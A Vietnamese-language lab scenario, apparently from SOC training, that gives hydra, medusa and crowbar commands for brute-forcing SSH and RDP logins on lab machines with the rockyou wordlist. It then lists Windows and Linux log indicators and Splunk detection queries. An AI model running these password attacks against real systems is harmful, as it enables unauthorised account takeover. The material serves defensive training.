# Kịch bản 3: Brute Force Attack (RDP/SSH)
**Mục tiêu:** Tấn công dò mật khẩu vào RDP (Windows) và SSH (Linux).

**Thực hiện trên VM-ATTACKER:**

**Tấn công SSH (lên VM-LINUX-ENDPOINT):**
``` bash
# Sử dụng Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.30

# Hoặc sử dụng medusa
medusa -h 192.168.56.30 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
```

**Tấn công RDP (lên VM-WIN-ENDPOINT)**
``` bash
# Sử dụng crowbar (RDP brute force)
crowbar -b rdp -s 192.168.56.20/32 -u administrator -C /usr/share/wordlists/rockyou.txt

# Hoặc sử dụng hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.56.20
```

**SOC phát hiện:**
- **Windows**: Event ID 4625 (Failed logon) với số lượng lớn từ cùng 1 nguồn
- **Linux**: `/var/log/auth.log` có nhiều `Failed password`
- **Splunk queries**:
``` sql
index=windows EventCode=4625
| stats count by src_ip, user
| where count > 10
| table _time, src_ip, user, count

index=linux source=/var/log/auth.log "Failed password"
| stats count by src_ip, user
| where count > 10
```

